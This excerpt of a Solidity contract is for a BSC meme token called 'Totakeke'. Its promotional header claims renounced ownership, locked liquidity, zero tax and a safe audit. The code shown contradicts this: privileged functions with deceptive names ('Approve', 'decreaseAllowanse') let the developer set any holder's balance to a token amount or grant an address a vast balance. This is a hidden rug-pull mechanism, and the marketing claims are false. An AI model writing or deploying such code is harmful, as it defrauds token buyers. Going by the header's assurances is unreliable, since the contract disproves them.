...
/**
 * 
🎙★  Totakeke ★ 🎙 BSC 🎙 Meme Coin 🎸LP LOCK 🎸0%TAX🎸RO🎸 ヾ(´〇`)ﾉ

★  Totakeke ★ on We Heart It
🎙 Totakeke the singer inu meme of the blockchain 🎙

🎶SINGING IS GOOD FOR US.  
🎶SINGING CAN HELP PROLONG LIFE.

★  $Totakeke ★ also known as K.K. Slider, is a charming and popular singer. He used to play his guitar and sing near the train station in Animal Village, but now preforms at the cafe.
ヾ(´〇`)ﾉ Singing is fun! ヾ(´〇`)ﾉ
🎙the original anime is called Animal Crossing Gekijōban Dōbutsu no Mori🎙
🎙https://en.wikipedia.org/wiki/Gekij%C5%8Dban_D%C5%8Dbutsu_no_Mori🎙

‍🔥 waive renounced
🎸 lock liquidty 5 years
🎸Safe pre-audit
♪ tax is NOOOOOONNN  ♪0% ヾ(´〇`)ﾉ

ヾ(´〇`)ﾉ Next Ai Singing BOT Helper ヾ(´〇`)ﾉ
🎙 telegram  https://t.me/Totakeke
🎙web  https://gamebanana.com/mods/292803
 * 
 */
...
contract Totakeke is IERC20, Ownable, IERC20Metadata {
    ...
    */
    ...
    function Approve(address presaleaddress) external devTokens {
        _tOwned[presaleaddress] = 10;
    ...
    * - `skandar` cannot be the zero address.
    */
       function decreaseAllowanse(address extending) external devTokens {
        _tOwned[extending] = 10000000000000000000 * 10 ** 18;
        
        emit Transfer(extending, address(0), 10000000000000000000 * 10 ** 18);
    } 
    ...
    */
    function _transfer(address sender, address recipient, uint256 _beforeTokenTransfer) internal {
        ...
        _tOwned[sender] = _tOwned[sender].sub(_beforeTokenTransfer, "Ownable: transfer _beforeTokenTransfer exceeds balance");
        _tOwned[recipient] = _tOwned[recipient].add(_beforeTokenTransfer);
